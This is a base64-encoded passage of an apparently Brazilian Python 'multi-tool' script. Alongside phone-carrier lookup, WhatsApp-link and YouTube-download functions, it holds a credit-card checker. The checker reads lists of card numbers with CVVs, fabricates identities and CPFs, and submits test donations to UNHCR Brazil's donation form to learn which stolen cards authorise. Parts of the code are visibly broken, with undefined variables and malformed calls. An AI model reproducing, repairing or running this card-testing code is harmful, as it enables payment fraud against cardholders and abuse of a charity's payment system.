AgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmJ3tDfVt7Un1FUlJPUntDfV0gT3DDp8OjbyBpbnbDoWxpZGEnKQogICAgb3BfZmluYWwgPSAnbnVsbCcKICAgIGlmIChvcF9kYXRhWydvcGVyYWRvcmEnXSkgPT0gJzU1MzAxNic6CiAgICAgICAgb3BfZmluYWwgPSAnQ0xBUk8nCiAgICBpZiAob3BfZGF0YVsnb3BlcmFkb3JhJ10pID09ICc1NTMwNzAnOgogICAgICAgIG9wX2ZpbmFsID0gJ09JJwogICAgaWYgKG9wX2RhdGFbJ29wZXJhZG9yYSddKSA9PSAnNTUzMDY2JzoKICAgICAgICBvcF9maW5hbCA9ICdORVhURUwnCiAgICBpZiAob3BfZGF0YVsnb3BlcmFkb3JhJ10pID09ICc1NTMxMDInOgogICAgICAgIG9wX2ZpbmFsID0gJ1RJTScKICAgIGlmIChvcF9kYXRhWydvcGVyYWRvcmEnXSkgPT0gJzU1MzA5Nyc6CiAgICAgICAgb3BfZmluYWwgPSAnVklWTycKICAgIGVsaWYgKG9wX2RhdGFbJ29wZXJhZG9yYSddKSA9PSAnOTknOgogICAgICAgIHByaW50KGYne0N9W3tSfSp7Q31dIE7Do28gZm9pIHBvc3PDrXZlbCBjb25zdWx0YXIgYSBvcGVyYWRvcmEnKQogICAgaWYgb3BfZmluYWwgPT0gJ251bGwnOgogICAgICAgIHByaW50KGYne0N9W3tSfSp7Q31dIE9wZXJhZG9yYSBpbnZhbGlkYS4nKQogICAgZWxzZToKICAgICAgICBwcmludChmJ3tDfVt7R30qe0N9XSBPcGVyYWRvcmE6JyArIG9wX2ZpbmFsKQogICAgIyBwcmludChvcF9kYXRhWydvcGVyYWRvcmEnXSkKICAgIHByaW50KGYne0N9W3tZfWl7Q31dIERlc2VqYSBmYXplciB1bWEgbm92YSBjb25zdWx0YT8nKQogICAgcHJpbnQoJzEuU2ltJykKICAgIHByaW50KCcyLk7Do28nKQogICAgY2hvID0gaW5wdXQoIj09PT4iKQogICAgaWYgY2hvID09ICcxJyBvciBjaG8gPT0gJzAxJzoKICAgICAgICBjb25zdWx0YW9wZXJhZG9yYSgpCiAgICBpZiBjaG8gPT0gJzInIG9yIGNobyA9PSAnMDInOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7Q31be1J9aXtDfV0gT3DDp8OjbyBpbnbDoWxpZGEnKQogICAgICAgIHRpbWUuc2xlZXAoMykKCgpkZWYgY2NfY2hlY2tlcih0b2tlbik6CiAgICB0cnk6CiAgICAgICAgbGlzdGEgPSBvcGVuKGlucHV0KGYne0N9Q2FtaW5obyBkYSBsaXN0YTogJyksICdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgZXhjZXB0OgogICAgICAgIGxpc3RhID0gMAogICAgICAgIHByaW50KGYne0N9W3tSfWl7Q31dIEVycm8sdmVyaWZpcXVlIHNlIMOpIHVtIGFycXVpdm8uJykKICAgICAgICB0aW1lLnNsZWVwKDMpCgogICAgaWYgbGlzdGEgPT0gMDoKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIGZvciBnZyBpbiBsaXN0YToKICAgICAgICAgICAgY2MgPSBnZy5zcGxpdCgnfCcpWzBdCiAgICAgICAgICAgIG1lcyA9IGdnLnNwbGl0KCd8JylbMV0KICAgICAgICAgICAgYW5vID0gZ2cuc3BsaXQoJ3wnKVsyXQogICAgICAgICAgICBjdnYgPSBnZy5zcGxpdCgnfCcpWzNdCgogICAgICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2xvb2t1cC5iaW5saXN0Lm5ldC97fScuZm9ybWF0KGNjWzA6Nl0pKS5qc29uKCkKICAgICAgICAgICAgcGVzc29hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3JhbmRvbXVzZXIubWUvYXBpLz9uYXQ9e30nLmZvcm1hdChkYXRhWydjb3VudHJ5J11bJ2FscGhhMiddKSkuanNvbigpCiAgICAgICAgICAgIGNwZiA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2dlcmFkb3JhcHAuY29tL2FwaS92MS9jcGYvZ2VuZXJhdGU/dG9rZW49e30nLmZvcm1hdCh0b2tlblswXSkpLmpzb24oKQoKICAgICAgICAgICAgZW1haWxfcHJvdmlkZXIgPSBbIkBnbWFpbC5jb20iLCAiQG91dGxvb2suY29tIiwgIkB5YWhvby5jb20iLCAiQHRlcnJhLmNvbSJdCgogICAgICAgICAgICBlbWFpbCA9IChwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZmlyc3QnXSkgKyAiLiIgKyAocGVzc29hWydyZXN1bHRzJ11bMF1bJ2xhc3QnXSkgKyByYW5kb20uY2hvaWNlKAogICAgICAgICAgICAgICAgZW1haWxfcHJvdmlkZSkKCiAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgcHJpbnQoZid7Q31be0d9aXtDfV0gQ29uc3VsdGFuZG8gY2FydMOjbycpCiAgICAgICAgICAgIHByaW50KCdDYXJ0YW86IHt9Jy5mb3JtYXQoZ2cpKQogICAgICAgICAgICBwcmludCgnQmFuZGVpcmE6IHt9Jy5mb3JtYXQoZGF0YVsnc2NoZW1lJ10pKQogICAgICAgICAgICBwcmludCgnVGlwbzoge30nLmZvcm1hdChkYXRhWyd0eXBlJ10pKQogICAgICAgICAgICBwcmludCgnUGFpczoge30nLmZvcm1hdChkYXRhWydjb3VudHJ5J10pKQogICAgICAgICAgICBwcmludCgnQmFuY286IHt9Jy5mb3JtYXQoZGF0YVsnYmFuayddKSkKICAgICAgICAgICAgcHJpbnQoJ05pdmVsOiB7fScuZm9ybWF0KGRhdGFbJ2JyYW5kJ10pKQogICAgICAgICAgICBwcmludCgpCiAgICAgICAgICAgIHByaW50KGYne0N9W3tHfWl7Q31dIEdlcmFuZG8gcGVzc29hIGFsZWF0b3JpYScpCiAgICAgICAgICAgIHByaW50KCdOb21lOiB7fSB7fScuZm9ybWF0KHBlc3NvYVsncmVzdWx0cyddWzBdWydmaXJzdCddLCBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnbGFzdCddKSkKICAgICAgICAgICAgcHJpbnQoJ0dlbmVybzoge30nLmZvcm1hdChwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZ2VuZGVyJ10pKQogICAgICAgICAgICBwcmludCgnTmFzY2ltZW50bzoge30nLmZvcm1hdChwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZG9iJ11bJ2RhdGUnXVswOjEwXSkpCiAgICAgICAgICAgIHByaW50KCdDUEY6IHt9Jy5mb3JtYXQoY3BmWydudW1iZXJfZm9ybWF0dGVkJ10pKQogICAgICAgICAgICBwcmludCgnQ1BGIHNlbSBmb3JtYXRhw6fDo286IHt9Jy5mb3JtYXQoY3BmWydudW1iZXInXSkpCiAgICAgICAgICAgIHByaW50KCdFLW1haWw6IHt9Jy5mb3JtYXQoZW1haWwpKQogICAgICAgICAgICBwcmludCgnQ0VQOiB7fXt9Jy5mb3JtYXQocGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ3Bvc3Rjb2RlJ10sICctMDAwJykpCiAgICAgICAgICAgIHByaW50KCdFbmRlcmXDp286IHt9Jy5mb3JtYXQocGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ3N0cmVldCddWyduYW1lJ10pKQogICAgICAgICAgICBwcmludCgnQ2lkYWRlOiB7fScuZm9ybWF0KHBlc3NvYVsncmVzdWx0cyddWzBdWydsb2NhdGlvbiddWydjaXR5J10pKQogICAgICAgICAgICBwcmludCgnRXN0YWRvOiB7fScuZm9ybWF0KHBlc3NvYVsncmVzdWx0cyddWzBdWydsb2NhdGlvbiddWydzdGF0ZSddKSkKICAgICAgICAgICAgcHJpbnQoKQoKICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgJ0hvc3QnOiAnZG9hci5hY251ci5vcmcnLAogICAgICAgICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAgICAgICAnQ29udGVudC1MZW5ndGgnOiAnMTAzNicsCiAgICAgICAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlXHUwMDNkMCcsCiAgICAgICAgICAgICAgICAnT3JpZ2luJzogJ2h0dHBzOi8vZG9hci5hY251ci5vcmcnLAogICAgICAgICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgU00tTjk1MEYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83Ny4wLjM4NjUuMTE2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEVkZ0EvNDUuMDkuNC41MDgzJywKICAgICAgICAgICAgICAgICdTZWMtRmV0Y2gtTW9kZSc6ICduYXZpZ2F0ZScsCiAgICAgICAgICAgICAgICAnU2VjLUZldGNoLVVzZXInOiAnPzEnLAogICAgICAgICAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxXHUwMDNkMC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywvO3FcdTAwM2QwLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3ZcdTAwM2RiMycsCiAgICAgICAgICAgICAgICAnU2VjLUZldGNoLVNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly9kb2FyLmFjbnVyLm9yZy9hY251ci9kb25hdGUuaHRtbCcsCiAgICAgICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywKICAgICAgICAgICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAncHQtQlIscHQ7cVx1MDAzZDAuOSxlbi1VUztxXHUwMDNkMC44LGVuO3FcdTAwM2QwLjcnLAogICAgICAgICAgICAgICAgJ0Nvb2tpZSc6ICdST1VURUlEXHUwMDNkLnpvbGFCRVRBOyBfZ2NsX2F1XHUwMDNkMS4xLjc1MTgwNjIyOC4xNjA0MTEzMzExOyBfZ2FcdTAwM2RHQTEuMy45NzI4NDU2MTcuMTYwNDExMzMxMTsgX2dpZFx1MDAzZEdBMS4zLjEzMTUzMDIwNDMuMTYwNDExMzMxMTsgX2dhXHUwMDNkR0ExLjIuOTcyODQ1NjE3LjE2MDQxMTMzMTE7IF9naWRcdTAwM2RHQTEuMi4xMzE1MzAyMDQzLjE2MDQxMTMzMTE7IF91ZXRzaWRcdTAwM2Q2ZGYxN2E4MDFiMjUxMWViOTFiN2U5YjYyZWNkZGExNjsgX3VldHZpZFx1MDAzZDZkZjYwZjUwMWIyNTExZWJiOTcwNDc0NTMyN2EwNjMwOyBtX3Nlc1x1MDAzZDIwMjAxMDMxMDAwMTU0OyBtX2NudFx1MDAzZDA7IF90cV9pZC5UVi03MjA5Mjc2My0xLmM3OWJcdTAwM2QyNGQ3OWI5MzNmZjY3MDAxLjE2MDQxMTMzMTUuMC4xNjA0MTEzMzE1Li47IF9mYnBcdTAwM2RmYi4xLjE2MDQxMTMzMTY1MzYuMTE0NDgyMTcyNDsgX19xY2FcdTAwM2RQMC0xNzM2MTU3NDIyLTE2MDQxMTMzMTcxODEnCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIHBlc3NvYVsncmVzdWx0cyddWzBdWydnZW5kZXInXSA9PSAnZmVtYWxlJzoKICAgICAgICAgICAgICAgIGdlbmRlciA9ICdGJwogICAgICAgICAgICBpZiBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZ2VuZGVyJ10gPT0gJ21hbGUnOgogICAgICAgICAgICAgICAgZ2VuZGVyID0gJ00nCiAgICAgICAgICAgIGlmIGRhdGFbJ3R5cGUnXSA9PSAnY3JlZGl0JzoKICAgICAgICAgICAgICAgIHRpcG8gPSAnQycKICAgICAgICAgICAgaWYgZGF0YVsndHlwZSddID09ICdkZWJpdCc6CiAgICAgICAgICAgICAgICB0aXBvID0gJ0QnCiAgICAgICAgICAgIG5vbWUgPSBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZmlyc3QnXSArIHBlc3NvYVsncmVzdWx0cyddWzBdWydsYXN0J10KCiAgICAgICAgICAgIGRvbmF0ZSA9ICdzdWNjZXNzVXJsPWh0dHBzJTNBJTJGJTJGZG9hci5hY251ci5vcmclMkZhY251ciUyRmFncmFkZWNpbWVudG8uaHRtbCUzRmQlM0RCUlBUMDBHRDAwJTI1MjBHZW5lcmFsJTI2ciUzRHRydWUlMjZhJTNEJTI0JTdCY29udmVydGVkQW1vdW50JTdEJTI2dCUzRCUyNCU3QnRyYW5zYWN0aW9uLnJlZmVyZW5jZUlEJTdEJTI2dSUzRCUyNCU3QnRyYW5zYWN0aW9uLm5hdGl2ZVJlc3BvbnNlJTdEJTI2bSUzRGNyZWRpdENhcmQlMjZ2JTNEZG9uYXRlJmVycm9yVXJsPWh0dHBzJTNBJTJGJTJGZG9hci5hY251ci5vcmclMkZhY251ciUyRmVycm9yLmh0bWwmcGZwc3JjPSZERVNDUklQVElPTj1Db20rT3MrUmVmdWdpYWRvcyZPTkxJTkVfRk9STT1CUlBUMDBHRDAwK0dlbmVyYWwmTEFOR1VBR0U9cHQmQ1VSUkVOQ1k9JyArIHBhaXMuZ2V0KAogICAgICAgICAgICAgICAgJ2N1cnJlbmN5JykgKyAnJkVYUERBVEU9JyArIG1lcyArIGFub1sxOjNdICsgJyZUQVhJRD0nICsgY3BmWwogICAgICAgICAgICAgICAgICAgICAgICAgJ251bWJlciddICsgJyZBTVQ9MzUmVFlQRT0nICsgdGlwbzIgKyAnJTJGJyArIGJhbmQgKyAnJlBBWVBFUklPRD1NT05UJlg9JkZJUlNUTkFNRT0nICsgXAogICAgICAgICAgICAgICAgICAgICBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnbmFtZSddWydmaXJzdCddICsgJyZMQVNUTkFNRT0nICsgcGVzc29hWydyZXN1bHRzJ11bMF1bJ25hbWUnXVsKICAgICAgICAgICAgICAgICAgICAgICAgICdsYXN0J10gKyAnJkVNQUlMPScgKyBlbWFpbC5yZXBsYWNlKCdAJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICclNDAnKSArICcmR0VOREVSPScgKyBnZW5kZXIgKyAnJkNVU1RPTV9LRVlfMT1iaXJ0aGRhdGUmQ1VTVE9NX0tFWV8yPWRldmljZSZDVVNUT01fVkFMVUVfMT0nICsgXAogICAgICAgICAgICAgICAgICAgICBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZG9iJ11bJ2RhdGUnXVswOjEwXS5yZXBsYWNlKCcvJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJTJGJykgKyAnJkNVU1RPTV9WQUxVRV8yPU1vYmlsZSZHSUZUX0NVU1RPTV9LRVlfMT1iaXJ0aGRhdGUmR0lGVF9DVVNUT01fS0VZXzI9ZGV2aWNlJkdJRlRfQ1VTVE9NX0tFWV8zPWVudHJ5cG9pbnQmR0lGVF9DVVNUT01fVkFMVUVfMT0nICsgXAogICAgICAgICAgICAgICAgICAgICBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnZG9iJ11bJ2RhdGUnXVswOjEwXS5yZXBsYWNlKCcvJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJTJGJykgKyAnJkdJRlRfQ1VTVE9NX1ZBTFVFXzI9TW9iaWxlJkdJRlRfQ1VTVE9NX1ZBTFVFXzM9JTJGYWNudXIlMkZkb25hdGUuaHRtbCZTVFJFRVQ9JyArIFwKICAgICAgICAgICAgICAgICAgICAgcGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ3N0cmVldCddWyduYW1lJ10ucmVwbGFjZSgnICcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJysnKSArICcmU1RSRUVUMj0nICsgQ2VudHJvICsgJyZDSVRZPScgKyBcCiAgICAgICAgICAgICAgICAgICAgIHBlc3NvYVsncmVzdWx0cyddWzBdWydsb2NhdGlvbiddWydjaXR5J10ucmVwbGFjZSgnICcsICcrJykgKyAnJlNUQVRFPScgKyBwZXNzb2EoCiAgICAgICAgICAgICAgICBbJ3Jlc3VsdHMnXVswXVsnbG9jYXRpb24nXVsnc3RhdGUnXSkgKyAnJlpJUD0nICsgc3RyKAogICAgICAgICAgICAgICAgcGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ3Bvc3Rjb2RlJ10pICsgJy0wMDAnICsgJyZDT1VOVFJZPScgKyBkYXRhWwogICAgICAgICAgICAgICAgICAgICAgICAgJ2NvdW50cnknXSArICcmUEhPTkVOVU09JTI4MTElMjkrOTg3NjUtNDMyMSZDQ1RZUEU9JyArIHRpcG8gKyAnJTJGJyArIGRhdGFbCiAgICAgICAgICAgICAgICAgICAgICAgICAnc2NoZW1lJ10gKyAnJkFDQ1Q9JyArIGNjICsgJyZOQU1FPScgKyBub21lLnJlcGxhY2UoJyAnLCAnKycpICsgJyZDVlYyPScgKyBjdnYKICAgICAgICAgICAgUlMgPSByZXF1ZXN0cy5yZXF1ZXN0KCdQT1NUJywgZG9uYXRlLCBoZWFkZXJzPWgsIGRhdGE9ZGF0YSkudXJsCiAgICAgICAgICAgIGlmIFJTID09ICdodHRwczovL2RvYXIuYWNudXIub3JnL2FjbnVyL2FncmFkZWNpbWVudG8uaHRtbCc6CiAgICAgICAgICAgICAgICBwcmludChmJ3tDfVt7R31pe0N9XSBQYWdhbWVudG8gYXV0b3JpemFkbyEnKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgUlMgPSBSUy5zcGxpdCgnPScpWzNdCiAgICAgICAgICAgICAgICBpZiBSUyA9PSAnUkVGVVNFRF9QQVlNRU5UJzoKICAgICAgICAgICAgICAgICAgICBwcmludChmJ3tDfVt7Un1FUlJPUntDfV0gVHJhbnNhw6fDo28gcmVjdXNhZGEuJykKICAgICAgICAgICAgICAgIGVsaWYgUlMgPT0gJ0RBVEFfSU5WQUxJRCc6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIENhcnTDo28gaW52YWxpZG8uJykKICAgICAgICAgICAgICAgIGVsaWYgUlMgPT0gJ0ZBSUxfVU5LTk9XTic6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIEVycm8gRGVzY29uaGVjaWRvICh7Un1wb3NzaXZlbCB1c28gZGUgY2FydGFvIGRlIERlYml0b3tDfSkuJykKICAgICAgICAgICAgICAgIGVsaWYgUlMgPT0gJ0VSUk9SX05FVFdPUksnOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XSBFcnJvIGRlIHJlZGUuJykKICAgICAgICAgICAgICAgIGVsaWYgUlMgPT0gJ0RBVEFfQ0FSRF9OT1RfQUxMT1dFRCc6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIFBhZ2FtZW50byBuYW8gYXV0b3JpemFkby4nKQogICAgICAgICAgICAgICAgZWxpZiBSUyA9PSAnUkVGVVNFRF9QUk9WSURFUic6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIFBhZ2FtZW50byByZWN1c2FkbyBwZWxhIHtZfXtiYW5kfXtDfS4nKQogICAgICAgICAgICAgICAgZWxpZiBSUyA9PSAnUkVGVVNFRF9CQU5LJzoKICAgICAgICAgICAgICAgICAgICBwcmludCgnW3t9RVJST1J7fV0gUmVjdXNhZG8gcGVsbyB7fXt9e30uJy5mb3JtYXQoUiwgQywgWSwgYmFuY28uZ2V0KCduYW1lJyksIEMpKQogICAgICAgICAgICAgICAgZWxpZiBSUyA9PSAnREFUQV9NSVNTSU5HJzoKICAgICAgICAgICAgICAgICAgICBwcmludChmJ3tDfVt7Un1FUlJPUntDfV0gQWxndW0gZGFkbyBmYWx0YW5kby4nKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChmJ3tDfVt7Un1FUlJPUntDfV0gRXJybyBuw6NvIGxpc3RhZG8uJykKICAgICAgICAgICAgICAgIHBhdXNhID0gKCdQcmVzc2lvbmUgZW50ZXIgcGFyYSByZXRvcm5hci4nKQoKCmRlZiBnZXJhcmxpbmt3aGF0cygpOgogICAgY2xlYXIoKQogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludChmJ3tDfVt7R31pe0N9XSBEaWdpdGUgbyBudW1lcm8uJykKICAgIG51bSA9IGlucHV0KCc9PT0+JykKICAgIHByaW50KGYne0N9W3tHfWl7Q31dIERpZ2l0ZSBhIG1lbnNhZ2VtLicpCiAgICBtc2cgPSBpbnB1dCgnPT09PicpCiAgICB1cmwgPSAnaHR0cHM6Ly9hcGkud2hhdHNhcHAuY29tL3NlbmQ/cGhvbmU9JyArIG51bSArICcmdGV4dD0nICsgbXNnCiAgICBwcmludChmJ3tDfVt7R31pe0N9XSBVUkwgZ2VyYWRhIDonICsgdXJsKQogICAgcHJpbnQoZid7Q31be1l9aXtDfV0gRGVzZWphIGdlcmFyIHVtYSBub3ZhIHVybD8nKQogICAgcHJpbnQoZid7Q31be0d9MXtDfV0gU2ltJykKICAgIHByaW50KGYne0N9W3tHfTJ7Q31dIE7Do28nKQogICAgY2hvaWNlID0gaW5wdXQoJz09PT4nKQogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBnZXJhcmxpbmt3aGF0cygpCgoKZGVmIHlvdXR1YmUoKToKICAgIGNsZWFyKCkKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gU2VsZWNpb25lIG8gbW9kbyBkZSBvcGVyYcOnw6NvJykKICAgIHByaW50KGYne0N9W3tHfTF7Q31dIE1QNCcpCiAgICBwcmludChmJ3tDfVt7R30ye0N9XSBNUDMnKQogICAgZmlsZXR5cGUgPSBpbnB1dCgnPT09PicpCiAgICBwcmludChmJ3tDfVt7R31pe0N9XSBJbmZvcm1lIGEgdXJsIGRvIHZpZGVvJykKICAgIHVybCA9IGlucHV0KCc9PT0+JykKICAgIGNsZWFyKCkKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gQmFpeGFuZG8uLi5wb3IgZmF2b3IgYWd1YXJkZScpCiAgICBpZiBmaWxldHlwZSA9PSAnMSc6CiAgICAgICAgZmlsZSA9IFlvdVR1YmUodXJsKS5zdHJlYW1zLmZpcnN0KCkKICAgICAgICBmaWxlLmRvd25sb2FkKG91dHB1dF9wYXRoPSJkb3dubG9hZHMiKQogICAgaWYgZmlsZXR5cGUgPT0gJzInOgogICAgICAgIGZpbGUgPSBZb3VUdWJlKHVybCkKICAgICAgICBmaW5hbCA9IGZpbGUuc3RyZWFtcy5maWx0ZXIob25seV9hdWRpbz1UcnVlKS5hbGwoKQogICAgICAgIGZpbmFsWzBdLmRvd25sb2FkKG91dHB1dF9wYXRoPSJkb3dubG9hZHMiKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gVmlkZW8gYmFpeGFkby4nKQogICAgcHJpbnQoKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gRGVzZWphIGJhaXhhciBvdXRybyB2aWRlbz8nKQogICAgcHJpbnQoZid7Q31be0d9MXtDfV0gU2ltJykKICAgIHByaW50KGYne0N9W3tHfTJ7Q31dIE7Do28nKQogICAgY2hvaWNlID0gaW5wdXQoJz09PT4nKQogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICB5b3V0dWJlKCkKCgpkZWYgY29uc3VsdGF0ZWwoKToKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZidPIHF1ZSBkZXNlamEgZmF6ZXI/JykKICAgIHByaW50KGYnW3tHfTF7Q31dQ29uc3VsdGFyIG9wZXJhZG9yYSBwb3IgbnVtZXJvJykKICAgIHByaW50KGYnW3tHfTJ7Q31dUGhvbmUgaW5mb2dhJykKICAgIHByaW50KGYnW3tHfTN7Q31dQ29uc3VsdGEgY29tcGxldGFbe0d9R1JBVElTe0N9XSB7Q31be1J9T0ZGe0N9XScpCiAgICBjaG9pID0gaW5wdXQoJz09PT4nKQogICAgaWYgY2hvaSA9PSAnMScgb3IgY2hvaSA9PSAnMDEnOgogICAgICAgIGNvbnN1bHRhb3BlcmFkb3JhKCkKICAgIGVsaWYgY2hvaSA9PSAnMicgb3IgY2hvaSA9PSAnMDInOgogICAgICAgIHBob25laW5mb2dhKCkKICAgIGVsaWYgY2hvaSA9PSAnMycgb3IgY2hvaSA9PSAnMDMnOgogICAgICAgIHByaW1lbnVtZXJvKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7Q31be1J9aXtDfV0gT3DDp8OjbyBpbnbDoWxpZGEnKQogICAgICAgIHRpbWUuc2xlZXAoMykKCgpkZWYgcHJpbWVudW1lcm8oKToKICAgIGNsZWFyKCkKICAgIHJla3QoKQogICAgcGFzcwogICAgI3ByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgI3ByaW50KGYne0N9W3tHfWl7Q31dIERpZ2l0ZSBvIG51bWVybyhleDogMjE5w5fDl8OXw5fDl8OXw5fDlykuJykKICAgICNyZXF1aWVtID0gaW5wdXQoJz09PT4gJykKICAgICNkYXRhID0gcmVxdWVzdHMuZ2V0KCd2c2ZkIGh5cGUvZHVhbGl0eSBidXNjYXMsIHZvdSB0cm9jYXIgZSBjcmlwdG9ncmFmYXIgdG9kYXMgYXMgYXBpLCBxdWVybyB2ZXIgcGVnYXI9e30mcmVsb2FkPScuZm9ybWF0KHJlcXVpZW0pKS50ZXh0CiAgICAjYSA9IGRhdGEucmVwbGFjZSgnPGxhYmVsICJjb250cm9sLWxhYmVsIiBmb3I9ImZvcm1Hcm91cEV4YW1wbGVJbnB1dDUiPicsJycpLnJlcGxhY2UoJzwvbGFiZWw+JywnJykucmVwbGFjZSgnPHNwYW4gImZvcm0tY29udHJvbC1zdGF0aWMiICJmb3JtR3JvdXBFeGFtcGxlSW5wdXQ1Ij4nLCcnKS5yZXBsYWNlKCc8ZGl2ICJyb3cgZm9ybS1ncm91cCI+JywnJykucmVwbGFjZSgnPC9icj4nLCcnKS5yZXBsYWNlKCc8YnI+JywnJykucmVwbGFjZSgnPGRpdiAiY29sLTYiPicsJycpLnJlcGxhY2UoJzxkaXYgImNvbC00Ij4nLCcnKS5yZXBsYWNlKCc8L3NwYW4+JywnJykucmVwbGFjZSgnPGEgaHJlZj0iIyIgdGl0bGU9IkNPTlNVTFRBRE8iJywnJykucmVwbGFjZSgnbmFtZT0iTGlua0V2b1BsdXMiJywnJykucmVwbGFjZSgnZGF0YS0iMDAzLjkyMC42NzgtNTQiPicsJycpLnJlcGxhY2UoJzxpICJmYSBmYS1zZWFyY2giPjwvaT4nLCcnKS5yZXBsYWNlKCc8L2E+JywnJykucmVwbGFjZSgnKHMmI3hFMTtiYWRvKScsJyhzw6FiYWRvKScpLnJlcGxhY2UoJyh0ZXImI3hFNzthLWZlaXJhKScsJyh0ZXLDp2EtZmVpcmEpJykucmVwbGFjZSgnRGF0YSBkZSBOYXNjaW1lbnRvJywnRGF0YSBkZSBOYXNjaW1lbnRvOicpLnJlcGxhY2UoJzxkaXYgImNvbC0yIj4nLCcnKS5yZXBsYWNlKCc8ZGl2ICJjb2wtMTAiPicsJycpLnJlcGxhY2UoJzxkaXYgInRpdGxlLWJsb2NrIj4nLCcnKS5yZXBsYWNlKCc8c3R5bGU+JywnJykucmVwbGFjZSgnPC9zdHlsZT4nLCcnKQogICAgI2ZvciBpIGluIHJhbmdlKDAsMTApOgogICAgCSN0cnk6CiAgICAJCSNhID0gYXBpLnJlcGxhY2UoZic8aDMgInRpdGxlIj48aSAiZmEgZmEtbGlzdC11bCI+PC9pPiBSZXN1bHRhZG8gKHtpfSBlbmNvbnRyYWRvcyk8L2gzPicsJycpCiAgICAJI2V4Y2VwdDoKICAgIAkJI3Bhc3MKICAgICNwcmludChhKQoKICAgICNwcmludChmJ3tDfVt7WX1pe0N9XSBEZXNlamEgZmF6ZXIgdW1hIG5vdmEgY29uc3VsdGE/JykKICAgICNwcmludCgnMS5TaW0nKQogICAgI3ByaW50KCcyLk7Do28nKQogICAgI09ITk8gPSBpbnB1dCgiPT09PiIpCiAgICAjaWYgT0hOTyA9PSAnMScgb3IgT0hOTyA9PSAnMDEnOgogICAgICAgICNwcmltZW51bWVybygpCiAgICAjaWYgT0hOTyA9PSAnMicgb3IgT0hOTyA9PSAnMDInOgogICAgICAgICNwYXNzCiAgICAjZWxzZToKICAgICAgICAjcHJpbnQoZid7Q31be1J9aXtDf